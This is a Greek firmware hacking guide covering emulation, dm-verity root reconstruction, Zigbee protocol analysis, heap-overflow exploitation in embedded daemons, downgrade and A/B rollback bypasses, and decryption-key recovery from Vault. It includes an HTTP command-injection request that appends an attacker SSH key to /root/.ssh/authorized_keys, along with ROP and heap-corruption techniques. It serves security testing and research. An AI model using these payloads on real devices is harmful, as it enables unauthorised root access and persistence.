Η διαδικασία emulation του firmware επιτρέπει **dynamic analysis** είτε της λειτουργίας μιας συσκευής είτε ενός μεμονωμένου προγράμματος. Αυτή η προσέγγιση μπορεί να συναντήσει προκλήσεις που σχετίζονται με εξαρτήσεις από το hardware ή την αρχιτεκτονική, αλλά η μεταφορά του root filesystem ή συγκεκριμένων binaries σε μια συσκευή με αντίστοιχη αρχιτεκτονική και endianness, όπως ένα Raspberry Pi, ή σε μια προρυθμισμένη εικονική μηχανή, μπορεί να διευκολύνει περαιτέρω δοκιμές.

### Emulation μεμονωμένων binaries

Για την εξέταση μεμονωμένων προγραμμάτων, είναι κρίσιμο να προσδιορίσετε το endianness και την αρχιτεκτονική CPU του προγράμματος.

#### Παράδειγμα με αρχιτεκτονική MIPS

Για να κάνετε emulation ενός binary αρχιτεκτονικής MIPS, μπορείτε να χρησιμοποιήσετε την εντολή:

```bash
file ./squashfs-root/bin/busybox
```

Και για να εγκαταστήσετε τα απαραίτητα εργαλεία εξομοίωσης:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Για MIPS (big-endian), χρησιμοποιείται το `qemu-mips`, ενώ για δυαδικά αρχεία little-endian η επιλογή θα ήταν το `qemu-mipsel`.

#### Εξομοίωση αρχιτεκτονικής ARM

Για δυαδικά αρχεία ARM, η διαδικασία είναι παρόμοια, με τη χρήση του εξομοιωτή `qemu-arm`.

### Εξομοίωση πλήρους συστήματος

Εργαλεία όπως το [Firmadyne](https://github.com/firmadyne/firmadyne), το [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) και άλλα διευκολύνουν την εξομοίωση ολόκληρου του firmware, αυτοματοποιώντας τη διαδικασία και υποστηρίζοντας τη δυναμική ανάλυση.

### Ανακατασκευή διαχωρισμένων και επαληθευμένων root filesystem για εξομοίωση

Αν το superblock του SquashFS είναι αναγνώσιμο, αλλά οι μετατοπίσεις των inode, των καταλόγων ή του πίνακα fragments είναι αδύνατες, μην τροποποιήσετε αμέσως το `unsquashfs`. Κάντε reverse engineering στο δυαδικό αρχείο της πρώιμης εκκίνησης και αναπαράγετε το γράφημα συσκευών block που δημιουργεί: τα ενσωματωμένα συστήματα μπορεί να εμφανίζουν ένα ονομαστικό root partition, αλλά να κατασκευάζουν το πραγματικό filesystem με αντιστοίχιση `dm-linear` που προσθέτει sectors από άλλο partition. Οι έλεγχοι μόνο του superblock μπορεί να πετύχουν, ακόμη κι όταν όλα τα επόμενα metadata blocks βρίσκονται σε λανθασμένες θέσεις.<sup>[[11]](#references)</sup>

Διατηρήστε ακριβώς την αριθμητική του firmware. Συγκεκριμένα, προσδιορίστε αν τα μήκη εκφράζονται σε bytes, sectors των 512 byte ή σελίδες των 4 KiB· αναπαράγετε τις μετατοπίσεις bit και την αποκοπή με την αρχική τους σειρά· και λάβετε υπόψη τις περιοχές στο τέλος που εξαρτώνται από την τράπεζα σε διατάξεις A/B. Για παράδειγμα, το `(partition_bytes >> 12) << 3` πρώτα αποκόπτει σε όριο 4 KiB και μόνο έπειτα εκφράζει το αποτέλεσμα σε sectors των 512 byte· αν το αντικαταστήσετε με `partition_bytes // 512`, η προστιθέμενη έκταση μπορεί να μετατοπιστεί κατά μερικά kilobyte και να καταστραφούν όλοι οι επόμενοι πίνακες του SquashFS.<sup>[[11]](#references)</sup>

Μια χρήσιμη ροή εργασίας επικύρωσης είναι η εξής:<sup>[[11]](#references)</sup>

1. Ανακτήστε από το δυαδικό αρχείο verifier/init τη συσκευή προέλευσης, τον αρχικό sector και το μήκος κάθε τμήματος `dm-linear`.
2. Συνενώστε ή αντιστοιχίστε τις εκτάσεις χωρίς να αλλάξετε τη σημασιολογία ευθυγράμμισής τους.
3. Αν η εξαγωγή εξακολουθεί να αποτυγχάνει, αναζητήστε μόνο σε ένα μικρό παράθυρο γύρω από το προβλεπόμενο όριο και απαιτήστε να βρεθούν διαδοχικά αρκετές έγκυρες δομές metadata, αντί να αποδεχτείτε μόνο ένα φαινομενικά εύλογο superblock.
4. Εκτελέστε το μη τροποποιημένο `unsquashfs` στο ανακατασκευασμένο image· η επιτυχής διάσχιση όλων των καταλόγων και των fragments αποτελεί ισχυρότερη ένδειξη από το `unsquashfs -stat`.

#### Αντικατάσταση του dm-verity υπό τον έλεγχο του αναλυτή

Όταν ο αναλυτής ελέγχει τον πυρήνα QEMU, το initramfs και τους εικονικούς δίσκους, μπορεί να εκκινηθεί ένα τροποποιημένο root αντικαθιστώντας το PID 1 επαλήθευσης του κατασκευαστή με ένα μικρό, στατικά συνδεδεμένο init. Πρόκειται για **αντικατάσταση της αλυσίδας εκκίνησης σε εργαστηριακό περιβάλλον**, όχι για παραβίαση του dm-verity, της υπογραφής RSA του, του Secure Boot ή ενός κλειδιού που είναι δεσμευμένο σε TPM.<sup>[[11]](#references)</sup>

Το init αντικατάστασης πρέπει να αναπαράγει τα λειτουργικά μέρη της αρχικής διαδρομής εκκίνησης: να προσαρτήσει το `devtmpfs`, να καλέσει τη `setsid()`, να συνδέσει το `/dev/console` με τους file descriptors 0–2, να προσαρτήσει τα `/proc` και `/sys`, να περιμένει τη διαθέσιμη block device, να προσαρτήσει το τροποποιημένο root μόνο για ανάγνωση, να αποσυνδέσει τα pseudo-filesystems του παλιού root, να μετακινήσει το νέο mount στο `/`, να εκτελέσει `chroot` και να καλέσει το `execve()` για το αρχικό `/sbin/init` του firmware. Η αποσύνδεση των `/dev`, `/proc` και `/sys` **πριν** από το `MS_MOVE` αποφεύγει την ακούσια αποσύνδεση mount points που ανήκουν στο νέο root.<sup>[[11]](#references)</sup>

Διατηρήστε τη μεταβλητή κατάσταση της συσκευής ξεχωριστά από το τροποποιημένο, αμετάβλητο root. Ένα overlay qcow2 μπορεί να διατηρήσει την κατάσταση LVM του αρχικού δίσκου, ενώ ένας δεύτερος δίσκος virtio μόνο για ανάγνωση παρέχει το τροποποιημένο SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Offline debugging κατάστασης image

Επιθεωρήστε την persistent κατάσταση εκτός του guest όταν αργές εκκινήσεις, καταστροφικά startup scripts ή αναξιόπιστη καταγραφή στην κονσόλα δυσκολεύουν τον εντοπισμό της αστοχίας. Μην προσαρτάτε ποτέ overlay που χρησιμοποιεί μια εκτελούμενη VM· εκθέστε το με `qemu-nbd`, περιορίστε την ανακάλυψη LVM στην προβλεπόμενη κατάτμηση NBD και απενεργοποιήστε το volume group πριν αποσυνδέσετε τη συσκευή.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Για επαναλήψιμη απομόνωση σφαλμάτων, γράψτε αρχεία-δείκτες με χρονική σήμανση σε έναν σταθερό τόμο με δυνατότητα εγγραφής και επαληθεύστε τα offline· τα `/dev/kmsg`, οι FIFO και οι προσωρινές κονσόλες μπορεί να δώσουν ψευδώς αρνητικά αποτελέσματα λόγω περιορισμού ρυθμού ή πρόωρου τερματισμού της διεργασίας. Επίσης, συγκρίνετε τις ακριβείς διεπαφές μεταξύ των επιπέδων πριν αλλάξετε άσχετο κώδικα: `uname -r` έναντι του `/lib/modules/`, τα χαρακτηριστικά ext4 στον δίσκο έναντι της διαμόρφωσης του kernel και τη γενιά του Mesa `libGL` έναντι του ABI του DRI driver και των ονομάτων driver που προκύπτουν από το PCI. Ένα στοιχείο μπορεί να υπάρχει, ακόμη και να φορτώνεται επιτυχώς με `dlopen()`, αλλά να παραμένει μη χρησιμοποιήσιμο επειδή ο καταναλωτής του αναμένει διαφορετικό ABI.<sup>[[11]](#references)</sup>

Οι δοκιμές ακεραιότητας του firmware είναι κρίσιμες για τον εντοπισμό πιθανών ευπαθειών backdoor.

### Αντιστοίχιση μηνυμάτων Zigbee / radio-co-processor

Στους IoT hubs, η στοίβα RF συχνά είναι κατανεμημένη μεταξύ ενός **radio MCU** και μιας διεργασίας userland του Linux. Μια χρήσιμη ροή εργασίας είναι η χαρτογράφηση της διαδρομής:<sup>[[8]](#references)</sup>

1. **Πλαίσιο RF** στον αέρα
2. **Parser στην πλευρά του controller** στο radio MCU
3. **Πρωτόκολλο κειμένου ή TLV μέσω serial/UART** που προωθείται στο Linux (για παράδειγμα `/dev/tty*`)
4. **Dispatcher εφαρμογής** στον κύριο daemon
5. **Handler / state machine ειδικά για το πρωτόκολλο**

Αυτή η αρχιτεκτονική δημιουργεί δύο στόχους για reverse engineering αντί για έναν. Αν ο controller μετατρέπει δυαδικά radio frames σε ένα πρωτόκολλο κειμένου όπως `Group,Command,arg1,arg2,...`, ανακτήστε:

- Τις **ομάδες μηνυμάτων** και τους πίνακες dispatch
- Ποια μηνύματα μπορούν να προέρχονται από το **δίκτυο** και ποια από τον ίδιο τον controller
- Τα ακριβή **πεδία διάκρισης ειδικά για τον κατασκευαστή** (για παράδειγμα, Zigbee `manufacturer_code` και προσαρμοσμένο `cluster_command`)
- Ποιοι handlers είναι προσβάσιμοι μόνο κατά το **commissioning**, την ανακάλυψη ή τις φάσεις λήψης firmware/model

Ειδικά για το Zigbee, καταγράψτε την κίνηση pairing και ελέγξτε αν η συσκευή-στόχος εξακολουθεί να βασίζεται στο προεπιλεγμένο **Link Key** `ZigBeeAlliance09`. Αν ισχύει, η παρακολούθηση της κίνησης commissioning μπορεί να αποκαλύψει το **Network Key**. Οι install codes του Zigbee 3.0 μειώνουν αυτή την έκθεση, οπότε σημειώστε αν η συσκευή που δοκιμάστηκε τους επιβάλλει πράγματι.

### Handlers πρωτοκόλλου ειδικοί για τον κατασκευαστή και προσβασιμότητα ελεγχόμενη από FSM

Οι εντολές Zigbee/ZCL ειδικές για τον κατασκευαστή αποτελούν συχνά καλύτερο στόχο από τα τυποποιημένα clusters, επειδή τροφοδοτούν **προσαρμοσμένο κώδικα parsing** και εσωτερικά **FSM** με λιγότερο δοκιμασμένη επικύρωση.<sup>[[8]](#references)</sup>

Πρακτική ροή εργασίας:

- Κάντε reverse engineering στον dispatcher εντολών μέχρι να βρείτε τον **handler που χρησιμοποιείται μόνο από τον κατασκευαστή**.
- Ανακτήστε τους πίνακες **κατάστασης FSM**, **συμβάντος**, **ελέγχου**, **ενέργειας** και **επόμενης κατάστασης**.
- Εντοπίστε **μεταβατικές καταστάσεις** που προχωρούν αυτόματα, καθώς και κλάδους retry/error που τελικά κάνουν reset ή αποδεσμεύουν κατάσταση ελεγχόμενη από τον επιτιθέμενο.
- Επιβεβαιώστε ποιες νόμιμες ανταλλαγές πρωτοκόλλου απαιτούνται για να περάσει ο daemon στην ευάλωτη κατάσταση, αντί να υποθέσετε ότι ο προβληματικός handler είναι πάντα προσβάσιμος.

Για πρωτόκολλα ευαίσθητα στον χρονισμό, η αναπαραγωγή πακέτων από ένα Python framework μπορεί να είναι πολύ αργή. Μια πιο αξιόπιστη προσέγγιση είναι η προσομοίωση μιας νόμιμης συσκευής σε πραγματικό hardware (για παράδειγμα, **nRF52840**) με στοίβα επιπέδου κατασκευαστή, ώστε να μπορείτε να εκθέσετε τα σωστά **endpoints**, **attributes** και τον χρονισμό του commissioning.

### Κατηγορία σφαλμάτων fragmented-download σε embedded daemons

Μια επαναλαμβανόμενη κατηγορία σφαλμάτων firmware εμφανίζεται σε λήψεις **fragmented blob/model/configuration**:<sup>[[8]](#references)</sup>

1. Το **πρώτο fragment** (`offset == 0`) αποθηκεύει το `ctx->total_size` και δεσμεύει μνήμη με `malloc(total_size)`.
2. Τα επόμενα fragments επικυρώνουν μόνο πεδία **τοπικά για το πακέτο**, ελεγχόμενα από τον επιτιθέμενο, όπως το `packet_total_size >= offset + chunk_len`.
3. Η αντιγραφή χρησιμοποιεί `memcpy(&ctx->buffer[offset], chunk, chunk_len)` χωρίς να ελέγχει αν το μέγεθος υπερβαίνει το **αρχικό μέγεθος της δεσμευμένης μνήμης**.

Έτσι, ένας επιτιθέμενος μπορεί να στείλει:

- Ένα πρώτο έγκυρο fragment με **μικρό** δηλωμένο συνολικό μέγεθος, ώστε να επιβάλει μια μικρή δέσμευση μνήμης στο heap.
- Ένα μεταγενέστερο fragment με το **αναμενόμενο offset**, αλλά μεγαλύτερο `chunk_len`.
- Ένα πλαστογραφημένο μέγεθος τοπικό για το πακέτο που ικανοποιεί τους νέους ελέγχους, ενώ εξακολουθεί να προκαλεί υπερχείλιση του αρχικά δεσμευμένου buffer.

Όταν η ευάλωτη διαδρομή βρίσκεται πίσω από λογική commissioning, η εκμετάλλευση πρέπει να περιλαμβάνει αρκετή **προσομοίωση συσκευής** ώστε να οδηγήσει τον στόχο στην αναμενόμενη κατάσταση λήψης model ή blob πριν από την αποστολή των κακοσχηματισμένων fragments.

### Ενεργοποίηση `free()` μέσω πρωτοκόλλου

Σε embedded daemons, ο ευκολότερος τρόπος ενεργοποίησης εκμετάλλευσης μεταδεδομένων heap συχνά δεν είναι «να περιμένετε τον καθαρισμό», αλλά να **αναγκάσετε τον ίδιο τον χειρισμό σφαλμάτων του πρωτοκόλλου**:<sup>[[8]](#references)</sup>

- Στείλτε κακοσχηματισμένα επόμενα fragments για να οδηγήσετε την FSM σε καταστάσεις **retry** ή **error**.
- Υπερβείτε το όριο προσπαθειών, ώστε ο daemon να κάνει **reset στο context** και να αποδεσμεύσει τον αλλοιωμένο buffer.
- Χρησιμοποιήστε αυτό το προβλέψιμο `free()` για να ενεργοποιήσετε primitives της πλευράς του allocator πριν καταρρεύσει η διεργασία για άσχετους λόγους.

Αυτό είναι ιδιαίτερα χρήσιμο απέναντι σε allocators τύπου **musl/uClibc/dlmalloc** σε embedded Linux, όπου η αλλοίωση μεταδεδομένων chunk μπορεί να μετατρέψει τη λογική unlink/unbin σε primitive εγγραφής. Ένα σταθερό μοτίβο είναι η αλλοίωση ενός **πεδίου μεγέθους**, ώστε να ανακατευθυνθεί η διάσχιση του allocator σε **πλαστά chunks τοποθετημένα μέσα στον buffer που έχει υποστεί υπερχείλιση**, αντί να καταστραφούν αμέσως πραγματικοί δείκτες bin και να καταρρεύσει η διεργασία.

## Binary Exploitation και Proof-of-Concept

Η ανάπτυξη ενός PoC για εντοπισμένες ευπάθειες απαιτεί βαθιά κατανόηση της αρχιτεκτονικής-στόχου και προγραμματισμό σε γλώσσες χαμηλού επιπέδου. Οι runtime προστασίες από binary exploitation είναι σπάνιες στα embedded συστήματα, αλλά όταν υπάρχουν, μπορεί να χρειαστούν τεχνικές όπως το Return Oriented Programming (ROP).

### Σημειώσεις εκμετάλλευσης uClibc fastbin (embedded Linux)

- **Fastbins + consolidation:** Το uClibc χρησιμοποιεί fastbins παρόμοια με το glibc. Μια μεταγενέστερη μεγάλη δέσμευση μνήμης μπορεί να ενεργοποιήσει το `__malloc_consolidate()`, οπότε κάθε πλαστό chunk πρέπει να περάσει τους ελέγχους (εύλογο μέγεθος, `fd = 0` και τα γειτονικά chunks να θεωρούνται «σε χρήση»).<sup>[[6]](#references)</sup>
- **Binaries χωρίς PIE υπό ASLR:** αν είναι ενεργό το ASLR αλλά το κύριο binary είναι **non-PIE**, οι διευθύνσεις `.data/.bss` μέσα στο binary είναι σταθερές. Μπορείτε να στοχεύσετε μια περιοχή που ήδη μοιάζει με έγκυρη κεφαλίδα heap chunk, ώστε μια δέσμευση fastbin να καταλήξει σε έναν **πίνακα δεικτών συναρτήσεων**.
- **NUL που διακόπτει το parser:** κατά το parsing JSON, ένα `\x00` στο payload μπορεί να διακόψει το parsing διατηρώντας ταυτόχρονα τα bytes που ακολουθούν και ελέγχονται από τον επιτιθέμενο για stack pivot/ROP chain.
- **Shellcode μέσω `/proc/self/mem`:** ένα ROP chain που καλεί `open("/proc/self/mem")`, `lseek()` και `write()` μπορεί να τοποθετήσει εκτελέσιμο shellcode σε γνωστό mapping και να μεταβεί σε αυτό.

## Επιθέσεις υποβάθμισης firmware και μη ασφαλείς μηχανισμοί ενημέρωσης

Ακόμη και όταν ένας κατασκευαστής εφαρμόζει ελέγχους κρυπτογραφικής υπογραφής για εικόνες firmware, η **προστασία από επαναφορά έκδοσης (downgrade) συχνά παραλείπεται**. Όταν ο bootloader ή ο recovery-loader επαληθεύει μόνο την υπογραφή με ενσωματωμένο δημόσιο κλειδί, αλλά δεν συγκρίνει την *έκδοση* (ή έναν monotonic counter) της εικόνας που αναβοσβήνει, ένας επιτιθέμενος μπορεί νόμιμα να εγκαταστήσει **παλαιότερο, ευάλωτο firmware που εξακολουθεί να φέρει έγκυρη υπογραφή** και έτσι να επαναφέρει ευπάθειες για τις οποίες είχαν κυκλοφορήσει διορθώσεις.<sup>[[4]](#references)</sup>

Τυπική ροή επίθεσης:

1. **Αποκτήστε μια παλαιότερη υπογεγραμμένη εικόνα**
   * Κατεβάστε την από τη δημόσια πύλη λήψεων του κατασκευαστή, το CDN ή τον ιστότοπο υποστήριξης.
   * Εξαγάγετέ την από συνοδευτικές εφαρμογές για κινητά/υπολογιστές (π.χ. από τον φάκελο `assets/firmware/` μέσα σε ένα Android APK).
   * Ανακτήστε την από αποθετήρια τρίτων, όπως το VirusTotal, αρχεία του Internet, forums κ.λπ.
2. **Ανεβάστε ή διαθέστε την εικόνα στη συσκευή** μέσω οποιουδήποτε εκτεθειμένου καναλιού ενημέρωσης:
   * Web UI, API εφαρμογής για κινητά, USB, TFTP, MQTT κ.λπ.
   * Πολλές καταναλωτικές συσκευές IoT εκθέτουν endpoints HTTP(S) *χωρίς έλεγχο ταυτότητας*, τα οποία δέχονται firmware blobs κωδικοποιημένα σε Base64, τα αποκωδικοποιούν στην πλευρά του server και ενεργοποιούν τη διαδικασία recovery/upgrade.
3. Μετά το downgrade, εκμεταλλευτείτε μια ευπάθεια που διορθώθηκε σε νεότερη έκδοση (για παράδειγμα, ένα φίλτρο command-injection που προστέθηκε αργότερα).
4. Προαιρετικά, εγκαταστήστε ξανά την πιο πρόσφατη εικόνα ή απενεργοποιήστε τις ενημερώσεις για να αποφύγετε τον εντοπισμό αφού αποκτήσετε persistence.

### Παράδειγμα: Command Injection μετά από Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Στο ευάλωτο (υποβαθμισμένο) firmware, η παράμετρος `md5` συνενώνεται απευθείας σε μια εντολή shell χωρίς sanitisation, επιτρέποντας την injection αυθαίρετων εντολών (εδώ — την ενεργοποίηση πρόσβασης root μέσω SSH key). Οι νεότερες εκδόσεις firmware εισήγαγαν ένα βασικό φίλτρο χαρακτήρων, αλλά η απουσία προστασίας από downgrade καθιστά τη διόρθωση άχρηστη.<sup>[[4]](#references)</sup>

### Εξαγωγή firmware από εφαρμογές για κινητά

Πολλοί προμηθευτές συμπεριλαμβάνουν πλήρεις εικόνες firmware στις συνοδευτικές εφαρμογές τους για κινητά, ώστε η εφαρμογή να μπορεί να ενημερώνει τη συσκευή μέσω Bluetooth/Wi-Fi. Αυτά τα πακέτα αποθηκεύονται συνήθως χωρίς κρυπτογράφηση στο APK/APEX, σε διαδρομές όπως `assets/fw/` ή `res/raw/`. Εργαλεία όπως τα `apktool`, `ghidra` ή ακόμη και το απλό `unzip` σάς επιτρέπουν να εξαγάγετε υπογεγραμμένες εικόνες χωρίς να αγγίξετε το φυσικό hardware.<sup>[[4]](#references)</sup>


### Παράκαμψη anti-rollback μόνο μέσω updater σε σχεδιασμούς με A/B slots

Ορισμένοι προμηθευτές υλοποιούν πράγματι έναν μηχανισμό anti-downgrade (**ratchet**), αλλά μόνο στη λογική του *updater* (για παράδειγμα, μια ρουτίνα UDS μέσω CAN, μια εντολή recovery ή ένας OTA agent σε userspace). Αν ο **bootloader** ελέγχει αργότερα μόνο την υπογραφή/CRC του image και εμπιστεύεται τον πίνακα partitions ή τα metadata των slots, η προστασία από rollback μπορεί και πάλι να παρακαμφθεί.<sup>[[7]](#references)</sup>

Τυπικός αδύναμος σχεδιασμός:

- Τα metadata του firmware περιέχουν τόσο έναν περιγραφέα έκδοσης όσο και έναν **security ratchet** / μονοτονικό μετρητή.
- Ο updater συγκρίνει το ratchet του image με μια τιμή που είναι αποθηκευμένη σε persistent storage και απορρίπτει παλαιότερα, υπογεγραμμένα images.
- Ο bootloader **δεν** αναλύει αυτό το ratchet και επαληθεύει μόνο την επικεφαλίδα, το CRC και την υπογραφή πριν εκκινήσει το επιλεγμένο slot.
- Η ενεργοποίηση του slot αποθηκεύεται ξεχωριστά, σε πίνακα partitions ή σε μετρητή generation ανά slot, και **δεν είναι κρυπτογραφικά δεσμευμένη** στο ακριβές digest του firmware που επικυρώθηκε.

Αυτό δημιουργεί ένα primitive **επικύρωσης ενός image / εκκίνησης άλλου image** σε συστήματα με dual-slot. Αν ο επιτιθέμενος μπορεί να κάνει τον updater να ορίσει το slot B ως επόμενο στόχο εκκίνησης, χρησιμοποιώντας ένα τρέχον υπογεγραμμένο image, και στη συνέχεια να αντικαταστήσει το slot B πριν από την επανεκκίνηση, ο bootloader μπορεί και πάλι να εκκινήσει το υποβαθμισμένο image, επειδή εμπιστεύεται μόνο τα metadata του slot που έχουν ήδη καταχωριστεί.

Συνηθισμένο μοτίβο εκμετάλλευσης:

1. Μεταφόρτωσε ένα **τρέχον υπογεγραμμένο** firmware στο παθητικό slot και εκτέλεσε την κανονική ρουτίνα επικύρωσης/εναλλαγής, ώστε η διάταξη να ορίσει αυτό το slot ως το επόμενο ενεργό.
2. **Μην κάνεις ακόμη επανεκκίνηση**. Μπες ξανά στη ρουτίνα προετοιμασίας/διαγραφής slot στην ίδια συνεδρία.
3. Εκμεταλλεύσου παρωχημένη κατάσταση εκκίνησης ή λογική επιλογής slot, ώστε ο updater να διαγράψει το **ίδιο φυσικό slot** που μόλις προήγαγε.
4. Γράψε ένα **παλαιότερο αλλά ακόμη υπογεγραμμένο** firmware σε αυτό το slot.
5. Παράλειψε τη ρουτίνα επικύρωσης που επιβάλλει το ratchet και κάνε απευθείας επανεκκίνηση.
6. Ο bootloader επιλέγει το προαχθέν slot, επαληθεύει μόνο την υπογραφή/ακεραιότητα και εκκινεί το παλιό image.

Τι να αναζητήσεις κατά την αντίστροφη ανάλυση υλοποιήσεων ενημέρωσης A/B:

- Επιλογή slot βάσει **σημαιών εκκίνησης** που δεν ανανεώνονται μετά από επιτυχημένη εναλλαγή.
- Ρουτίνα τύπου `prepare_passive_slot()` που διαγράφει ένα slot βάσει παρωχημένης κατάστασης αντί της **τρέχουσας καταχωρισμένης διάταξης**.
- Συνάρτηση τύπου `part_write_layout()` που απλώς αυξάνει έναν **μετρητή generation** / αλλάζει τη σημαία ενεργού slot και δεν αποθηκεύει το hash του image που επικυρώθηκε.
- Έλεγχοι ratchet που υλοποιούνται σε userspace ή στον κώδικα του updater, αλλά **όχι** στα στάδια ROM / bootloader / secure boot.
- Ρουτίνες διαγραφής ή recovery που αφήνουν το slot σημειωμένο ως εκκινήσιμο, ακόμη και αφού το περιεχόμενό του διαγραφεί και αντικατασταθεί.

### Λίστα ελέγχου για την αξιολόγηση της λογικής ενημέρωσης

* Είναι επαρκώς προστατευμένη η μεταφορά/ταυτοποίηση του *update endpoint* (TLS + authentication);
* Συγκρίνει η συσκευή **αριθμούς έκδοσης** ή έναν **μονοτονικό μετρητή anti-rollback** πριν από το flashing;
* Επαληθεύεται το image μέσα σε αλυσίδα secure boot (π.χ. οι υπογραφές ελέγχονται από κώδικα ROM);
* Επιβάλλει ο **bootloader το ίδιο ratchet** με τον updater, αντί να ελέγχει μόνο την υπογραφή/CRC;
* Είναι τα metadata ενεργοποίησης του slot **δεσμευμένα στο digest/την έκδοση του firmware που επικυρώθηκε**, ή μπορεί να τροποποιηθεί ένα slot μετά την προαγωγή του;
* Μετά από επιτυχημένη εναλλαγή slot, αναγκάζεται η συσκευή να κάνει επανεκκίνηση ή παραμένουν προσβάσιμες μεταγενέστερες ρουτίνες ενημέρωσης/διαγραφής στην ίδια συνεδρία;
* Εκτελεί ο κώδικας userland πρόσθετους ελέγχους λογικής (π.χ. επιτρεπόμενο partition map, αριθμό μοντέλου);
* Επαναχρησιμοποιούν οι ροές ενημέρωσης *μερικού* ή *εφεδρικού* τύπου την ίδια λογική επικύρωσης;

> 💡  Αν λείπει κάποιο από τα παραπάνω, η πλατφόρμα είναι πιθανότατα ευάλωτη σε επιθέσεις rollback.

## Ανάκτηση κλειδιών αποκρυπτογράφησης firmware από ενσωματωμένη κατάσταση KMS/Vault

Όταν ένα image ενημέρωσης συνδυάζει μικρά metadata σε plaintext με ένα μεγάλο blob υψηλής εντροπίας, κάνε πρώτα διαλογή του container και μετά δοκίμασε brute force:<sup>[[1]](#references)</sup>

- Εξήγαγε επικεφαλίδες, offsets και όρια γραμμών με `hexdump`, `xxd`, `strings -tx`, `base64 -d` και `binwalk -E`.
- Το `Salted__` συνήθως υποδεικνύει μορφή OpenSSL `enc`: τα επόμενα 8 bytes είναι το salt και τα υπόλοιπα bytes είναι το ciphertext.
- Ένα πεδίο Base64 που αποκωδικοποιείται σε ακριβώς `256` bytes αποτελεί ισχυρή ένδειξη ότι πρόκειται για ciphertext RSA-2048 που περιέχει κρυπτογραφημένο τυχαίο συνθηματικό firmware/κλειδί συνεδρίας.
- Αποσπασμένο υλικό PGP στο ίδιο αρχείο συχνά προστατεύει μόνο την αυθεντικότητα· μην υποθέσεις ότι χρησιμοποιείται για την εμπιστευτικότητα.

Αν η αναζήτηση στατικών κλειδιών (`grep`, `strings`, αναζητήσεις PEM/PGP) αποτύχει, κάνε αντίστροφη ανάλυση της **λειτουργικής διαδρομής αποκρυπτογράφησης**, αντί να ψάχνεις μόνο για ιδιωτικά κλειδιά:

- Αποσυμπίεσε τον updater / το binary διαχείρισης και ακολούθησε ποιος διαβάζει το κρυπτογραφημένο blob, ποιο helper/API το αποκρυπτογραφεί και ποιο λογικό όνομα κλειδιού ζητά.
- Αναζήτησε στο εξαγόμενο root filesystem κατάσταση KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), καθώς και αρχεία unit και scripts init.
- Αντιμετώπισε εντολές `vault operator unseal ...` σε plaintext, κλειδιά recovery, bootstrap tokens ή τοπικά scripts αυτόματου unseal KMS ως ισοδύναμα με υλικό ιδιωτικού κλειδιού.

Αν η συσκευή περιλαμβάνει το αρχικό binary Vault και το backend αποθήκευσης, η αναπαραγωγή αυτού του περιβάλλοντος είναι συνήθως ευκολότερη από την επανυλοποίηση των εσωτερικών λειτουργιών του Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Με root στο cloned KMS:

- Κάντε τα transit keys exportable μόνο μέσα στο απομονωμένο clone: `vault write transit/keys/<name>/config exportable=true`
- Εξαγάγετε το unwrap key: `vault read transit/export/encryption-key/<name>`
- Δοκιμάστε το ανακτημένο RSA key με το ακριβές ζεύγος padding/hash που χρησιμοποιεί το KMS. Μια αποτυχημένη αποκρυπτογράφηση PKCS#1 v1.5 και μια αποτυχημένη προεπιλεγμένη αποκρυπτογράφηση OAEP **δεν** αποδεικνύουν ότι το key είναι λανθασμένο· πολλές ροές που βασίζονται στο Vault χρησιμοποιούν OAEP με SHA-256, ενώ οι συνηθισμένες βιβλιοθήκες έχουν ως προεπιλογή το SHA-1.
- Αν το payload αρχίζει με `Salted__`, αναπαράγετε ακριβώς το OpenSSL KDF του προμηθευτή (`EVP_BytesToKey`, συχνά MD5 σε παλαιότερες συσκευές) πριν επιχειρήσετε αποκρυπτογράφηση AES-CBC.

Έτσι, το «κρυπτογραφημένο firmware» γίνεται ένα γενικότερο πρόβλημα: **ανακτήστε τα operational keys της συσκευής και, στη συνέχεια, αναπαράγετε offline τις ακριβείς παραμέτρους unwrap + KDF**.
